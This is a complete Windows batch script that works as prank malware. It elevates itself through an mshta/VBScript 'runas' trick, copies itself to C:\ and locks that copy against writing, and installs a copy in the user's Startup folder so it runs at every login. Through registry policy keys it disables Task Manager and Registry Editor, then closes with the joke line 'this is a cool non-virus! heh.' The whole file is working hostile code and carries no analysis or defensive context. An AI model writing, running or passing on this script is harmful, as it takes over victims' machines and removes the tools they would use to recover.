@echo off
cls

:: Check for admin rights
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting Administrator privileges...
    goto UACPrompt
)

:UACPrompt
if '%1'=='RightClick' goto SkipUAC
mshta vbscript:createobject("shell.application").shellexecute("%~s0","RightClick","","runas",1)(window.close)
exit /b

:SkipUAC

:: Variables
set "source=%~f0"
set "filename=%~nx0"

:: Small delay for stability
timeout /t 2 >nul

:: Copy to C:\
copy /y "%source%" "C:\%filename%" >nul

:: Set permissions: allow Read & Execute, deny Write/Delete (only on C:\ copy)
icacls "C:\%filename%" /grant Everyone:(R,X) /c /q >nul
icacls "C:\%filename%" /deny Everyone:(W) /c /q >nul

:: Copy to Startup (no permission changes)
copy /y "%source%" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\%filename%" >nul

:: Disable Task Manager
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f >nul

:: Disable Registry Editor
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f >nul

echo this is a cool non-virus! heh.
pause >nul
exit
